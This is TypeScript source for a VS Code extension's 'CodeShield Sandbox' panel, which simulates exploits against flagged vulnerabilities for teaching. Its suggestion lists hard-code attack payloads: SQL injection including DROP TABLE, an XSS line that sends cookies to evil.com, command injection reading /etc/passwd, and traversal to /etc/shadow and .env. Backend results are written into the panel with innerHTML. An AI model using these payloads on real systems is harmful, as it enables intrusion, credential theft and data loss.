import * as vscode from 'vscode';
import { Issue, simulateExploit } from './apiClient';

// ── Helpers ───────────────────────────────────────────────────────────────────
function formatType(raw: string): string {
  const map: Record<string, string> = {
    'SQL_INJECTION': 'SQL Injection',
    'XSS': 'Cross-Site Scripting (XSS)',
    'COMMAND_INJECTION': 'Command Injection',
    'PATH_TRAVERSAL': 'Path Traversal',
    'HARDCODED_SECRET': 'Hardcoded Secret',
    'WEAK_RANDOMNESS': 'Weak Randomness',
    'INSECURE_DESERIAL': 'Insecure Deserialization',
    'CSRF': 'CSRF',
    'SSRF': 'SSRF',
  };
  return map[raw] || raw.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
}

function esc(s: string): string {
  return (s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

// ── Suggestions ─────────────────────────────────────────────────────────────
function getSuggestions(type: string): string[] {
  const t = type.toLowerCase();
  if (t.includes('sql')) {
    return ["' OR 1=1 --", "' UNION SELECT username,password FROM users --", "admin' --", "'; DROP TABLE users; --"];
  }
  if (t.includes('xss') || t.includes('cross') || t.includes('script')) {
    return ["<svg/onload=alert(1)>", "<script>fetch('https://evil.com?c='+document.cookie)</script>", "<img src=x onerror=alert(document.domain)>"];
  }
  if (t.includes('command')) {
    return ["127.0.0.1; whoami", "127.0.0.1 && cat /etc/passwd", "127.0.0.1 | id"];
  }
  if (t.includes('path') || t.includes('traversal')) {
    return ["../../../etc/passwd", "../../../../etc/shadow", "../../../../app/.env"];
  }
  return ["' OR 1=1 --", "<script>alert(1)</script>"];
}

// ── Simulation engine ───────────────────────────────────────────────────────── (Removed local engine)

// ── SimulationPanel WebviewPanel ──────────────────────────────────────────────
export class SimulationPanel {
  public static currentPanel: SimulationPanel | undefined;
  private readonly _panel: vscode.WebviewPanel;
  private readonly _extensionUri: vscode.Uri;
  private _disposables: vscode.Disposable[] = [];
  private _issue: Issue | undefined;

  public static createOrShow(extensionUri: vscode.Uri, issue: Issue) {
    const column = vscode.window.activeTextEditor
      ? vscode.window.activeTextEditor.viewColumn
      : undefined;

    if (SimulationPanel.currentPanel) {
      SimulationPanel.currentPanel._panel.reveal(column);
      SimulationPanel.currentPanel.update(issue);
      return;
    }

    const panel = vscode.window.createWebviewPanel(
      'codeshieldSimulation',
      'CodeShield Sandbox',
      column || vscode.ViewColumn.One,
      { enableScripts: true, localResourceRoots: [extensionUri] }
    );

    SimulationPanel.currentPanel = new SimulationPanel(panel, extensionUri);
    SimulationPanel.currentPanel.update(issue);
  }

  private constructor(panel: vscode.WebviewPanel, extensionUri: vscode.Uri) {
    this._panel = panel;
    this._extensionUri = extensionUri;
    this._panel.onDidDispose(() => this.dispose(), null, this._disposables);

    this._panel.webview.onDidReceiveMessage(async (msg) => {
      if (msg.type === 'runSim' && this._issue) {
        const result = await simulateExploit({
          vuln_type: this._issue.type,
          payload: msg.payload,
          code_snippet: this._issue.code_snippet || '',
          language: 'javascript'
        });

        if (result) {
          this._panel.webview.postMessage({
            type: 'simResult',
            query: result.query,
            attackResult: result.attack_result,
            attackClass: result.attack_class,
            isAttack: result.is_attack,
            impact: result.impact
          });
        }
      }
    }, null, this._disposables);
  }

  public update(issue: Issue) {
    this._issue = issue;
    this._panel.title = `Sandbox: ${issue.type}`;
    this._panel.webview.html = this.getHtmlForWebview(this._panel.webview, issue);
  }

  public dispose() {
    SimulationPanel.currentPanel = undefined;
    this._panel.dispose();
    while (this._disposables.length) {
      const x = this._disposables.pop();
      if (x) { x.dispose(); }
    }
  }

  private getNonce() {
    let text = '';
    const possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < 32; i++) {
      text += possible.charAt(Math.floor(Math.random() * possible.length));
    }
    return text;
  }

  private escAttr(s: string): string {
    return (s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
  }

  private defaultPayload(type: string): string {
    const t = (type || '').toLowerCase();
    if (t.includes('sql')) { return "' UNION SELECT id, username, password FROM users --"; }
    if (t.includes('xss') || t.includes('cross') || t.includes('script')) { return '<svg/onload=alert(1)>'; }
    if (t.includes('command') || t.includes('exec')) { return '127.0.0.1; whoami'; }
    if (t.includes('path') || t.includes('traversal') || t.includes('lfi')) { return '../../../etc/passwd%00'; }
    if (t.includes('secret') || t.includes('hardcoded') || t.includes('key')) { return 'AKIAIOSFODNN7EXAMPLE'; }
    if (t.includes('random') || t.includes('crypto') || t.includes('weak')) { return '0.7381'; }
    return 'malicious_input';
  }

  private getHtmlForWebview(webview: vscode.Webview, issue: Issue): string {
    const nonce = this.getNonce();
    const payload = this.escAttr(issue.simulation?.payload || this.defaultPayload(issue.type));
    const suggestions = getSuggestions(issue.type);
    const suggestionJson = JSON.stringify(suggestions).replace(/</g, '\\x3c').replace(/>/g, '\\x3e');

    return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'nonce-${nonce}';">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:var(--vscode-font-family);padding:24px;color:var(--vscode-foreground);background:var(--vscode-editor-background);display:flex;justify-content:center}
.wrap{max-width:840px;width:100%}
h1{font-size:22px;font-weight:700;margin-bottom:20px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.badge{font-size:12px;font-weight:600;background:var(--vscode-badge-background);color:var(--vscode-badge-foreground);padding:3px 10px;border-radius:12px;opacity:.85}
.card{padding:14px;border:1px solid var(--vscode-panel-border);border-radius:6px;margin-bottom:16px;background:var(--vscode-sideBar-background)}
label,.lbl{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px;display:block;opacity:.8}
textarea{width:100%;background:var(--vscode-input-background);color:var(--vscode-input-foreground);border:1.5px solid rgba(150,150,150,.3);border-radius:5px;padding:12px 14px;font-family:monospace;font-size:14px;outline:none;resize:vertical;min-height:80px;transition:border .2s}
textarea:focus{border-color:#1890ff}
.suggestions{display:flex;flex-wrap:wrap;gap:6px;margin-top:10px}
.sug{background:rgba(24,144,255,.1);color:#1890ff;border:1px solid rgba(24,144,255,.3);border-radius:4px;padding:4px 10px;font-size:12px;font-family:monospace;cursor:pointer;transition:background .15s}
.sug:hover{background:rgba(24,144,255,.25)}
.sug-label{font-size:11px;opacity:.7;margin-bottom:6px}
button{display:block;width:100%;padding:12px;background:linear-gradient(135deg,#52c41a,#389e0d);color:#fff;border:none;border-radius:5px;font-size:15px;font-weight:700;cursor:pointer;margin:0 0 16px;transition:opacity .15s}
button:active{opacity:.82}
.class-tag{display:inline-flex;align-items:center;gap:6px;background:rgba(255,165,0,.12);border:1px solid rgba(255,165,0,.35);color:#ffa940;border-radius:20px;padding:4px 12px;font-size:12px;font-weight:700;margin-bottom:16px}
.class-tag.safe{background:rgba(82,196,26,.12);border-color:rgba(82,196,26,.35);color:#52c41a}
.pbox{border-radius:5px;padding:14px 16px;font-family:monospace;font-size:13px;white-space:pre-wrap;word-break:break-all;line-height:1.6;min-height:48px}
.blue{background:rgba(24,144,255,.07);border:1px solid rgba(24,144,255,.2)}
.res{border-radius:5px;padding:14px 16px;font-family:monospace;font-size:13px;white-space:pre-wrap;word-break:break-all;line-height:1.6;min-height:60px;background:rgba(250,219,20,.07);border:1px solid rgba(250,219,20,.2);margin-bottom:16px}
.impact-box{border-radius:5px;padding:12px 16px;font-size:14px;font-weight:600;text-align:center;margin-bottom:0}
.impact-box.warn{background:rgba(255,77,79,.1);border:1px solid rgba(255,77,79,.3);color:#ff4d4f}
.impact-box.ok{background:rgba(82,196,26,.1);border:1px solid rgba(82,196,26,.3);color:#52c41a}
.attack-label{color:#ff4d4f;font-size:13px;font-weight:600;margin-top:8px}
.ftbl{width:100%;border-collapse:collapse;font-size:12.5px}
.ftbl th,.ftbl td{border:1px solid var(--vscode-panel-border);padding:5px 10px;text-align:left}
.ftbl th{background:rgba(24,144,255,.12);font-weight:600}
@media(max-width:600px){.compare{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="wrap">
  <h1>🧪 Interactive Sandbox <span class="badge">${this.escAttr(formatType(issue.type))}</span></h1>

  <!-- Payload Input -->
  <div class="card">
    <label>🔑 Attacker Payload <span style="background:rgba(24,144,255,.15);color:#1890ff;font-size:10px;padding:2px 8px;border-radius:8px;margin-left:6px">EDITABLE</span></label>
    <textarea id="pay">${payload}</textarea>

    <div style="margin-top:10px">
      <div class="sug-label">💡 Try these payloads:</div>
      <div class="suggestions" id="sugs"></div>
    </div>
  </div>

  <button id="btn">⚡ Run Simulation</button>

  <!-- Attack classification -->
  <div id="classWrap" style="display:none;margin-bottom:16px">
    <span class="class-tag" id="classTag">🎯 —</span>
  </div>

  <!-- Dynamic Query -->
  <div class="card">
    <div class="lbl">Injected Query / Execution Context</div>
    <div class="pbox blue" id="q">—</div>
  </div>

  <!-- Simulated Result -->
  <div class="card">
    <div class="lbl">Simulated Result</div>
    <div class="res" id="res">—</div>
  </div>

  <!-- Impact -->
  <div id="im"></div>
</div>

<script nonce="${nonce}">
(function() {
  var vsc = acquireVsCodeApi();
  var sugs = ${suggestionJson};

  // Render suggestions
  var sugEl = document.getElementById('sugs');
  sugs.forEach(function(s) {
    var btn = document.createElement('button');
    btn.className = 'sug';
    btn.style.cssText = 'display:inline-block;width:auto;margin:0;padding:4px 10px;font-size:12px;font-weight:500;background:rgba(24,144,255,.1);color:#1890ff;border:1px solid rgba(24,144,255,.3);border-radius:4px;cursor:pointer';
    btn.textContent = s;
    btn.addEventListener('click', function() {
      document.getElementById('pay').value = s;
    });
    sugEl.appendChild(btn);
  });

  document.getElementById('btn').addEventListener('click', function() {
    var payload = document.getElementById('pay').value;
    document.getElementById('q').textContent = 'Running…';
    document.getElementById('res').textContent = 'Running…';
    document.getElementById('im').innerHTML = '';
    document.getElementById('classWrap').style.display = 'none';
    vsc.postMessage({ type: 'runSim', payload: payload });
  });

  window.addEventListener('message', function(e) {
    var d = e.data;
    if (d.type !== 'simResult') { return; }

    document.getElementById('q').innerHTML = d.query;
    document.getElementById('res').innerHTML = d.attackResult;

    // Attack classification badge
    var classWrap = document.getElementById('classWrap');
    var classTag = document.getElementById('classTag');
    classWrap.style.display = 'block';
    classTag.className = d.isAttack ? 'class-tag' : 'class-tag safe';
    classTag.innerHTML = (d.isAttack ? '🎯 ' : '✅ ') + d.attackClass;

    // Impact
    document.getElementById('im').innerHTML =
      '<div class="impact-box ' + (d.isAttack ? 'warn' : 'ok') + '">' +
      (d.isAttack ? '💥 ' : '✅ ') + d.impact + '</div>';
  });
}());
</script>
</body>
</html>`;
  }
}
